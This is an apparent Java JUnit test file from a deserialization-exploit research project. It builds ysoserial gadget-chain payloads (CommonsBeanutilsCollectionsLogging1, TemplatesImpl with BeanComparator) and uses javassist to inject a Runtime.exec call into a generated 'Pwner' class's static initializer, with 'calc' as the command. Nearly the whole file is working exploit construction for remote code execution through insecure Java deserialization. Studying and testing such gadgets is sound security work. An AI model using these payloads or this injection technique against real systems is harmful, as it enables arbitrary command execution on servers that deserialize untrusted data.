package angelwhu.payloadTest;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.math.BigInteger;
import java.security.AccessController;
import java.security.PrivilegedAction;
import java.util.PriorityQueue;
import java.util.TreeSet;

import javassist.CannotCompileException;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewMethod;
import javassist.NotFoundException;

import org.apache.commons.beanutils.BeanComparator;
import org.junit.Test;

import ysoserial.payloads.CommonsBeanutilsCollectionsLogging1;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import angelwhu.serialization.SerializationUtil;

import com.sun.org.apache.xalan.internal.utils.ObjectFactory;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class CommonsBeanutilsCollectionsLogging1PayloadTest {

	
	@Test
	public void testClassPool() throws CannotCompileException, NotFoundException, IOException
	{
		String command = "calc";
		
		ClassPool pool = ClassPool.getDefault();
		pool.insertClassPath(new ClassClassPath(angelwhu.model.Point.class));
		CtClass cc = pool.get(angelwhu.model.Point.class.getName());
		//System.out.println(angelwhu.model.Point.class.getName());
		
		cc.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") +"\");");
		//加入关键执行代码，生成一个静态函数。
		
		String newClassNameString = "angelwhu.Pwner" + System.nanoTime();
		cc.setName(newClassNameString);
		
		CtMethod mthd = CtNewMethod.make("public static void main(String[] args) throws Exception {new " + newClassNameString + "();}", cc);
		cc.addMethod(mthd);
		
		cc.writeFile();
		
//		final byte[] classBytes = cc.toBytecode();
//		System.out.println(classBytes);
	}
	
	@Test
	public void testPayload() throws Exception
	{
		
		String command = "calc";
		ObjectPayload<?> payload = new CommonsBeanutilsCollectionsLogging1();
		final Object object = payload.getObject(command);
		SerializationUtil.readObjectFromStream(object);
		
	}
	
	@Test
	public void testPayloadExp() throws Exception
	{
		final TemplatesImpl templates = Gadgets.createTemplatesImpl("calc");
		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("outputProperties");

		// create queue with numbers and basic comparator
		final TreeSet<Object> treeSet = new TreeSet<Object>(comparator);
		// stub data for replacement later
		treeSet.add(templates);
		treeSet.add(templates);

	}

}
